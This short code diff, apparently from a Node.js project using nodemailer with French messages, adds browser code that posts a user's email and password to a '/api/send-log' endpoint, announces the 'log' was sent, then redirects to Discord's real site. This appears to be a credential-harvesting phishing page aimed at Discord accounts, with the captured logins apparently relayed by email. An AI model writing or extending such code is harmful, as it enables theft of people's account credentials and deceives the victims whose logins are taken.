@@ -41,3 +41,20 @@ const nodemailer = require("nodemailer");
         res.status(500).json({ message: "Erreur d'envoi d'email", error });
     }
 }
+fetch("/api/send-log", {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ email: email, password: password })
+})
+.then(response => response.json())
+.then(data => {
+    console.log(data);
+    alert("Log envoyé avec succès !");
+    window.location.href = "https://discord.com/channels/@me";
+})
+.catch(error => {
+    console.error("Erreur :", error);
+    alert("Une erreur est survenue lors de l'envoi des logs.");
+});
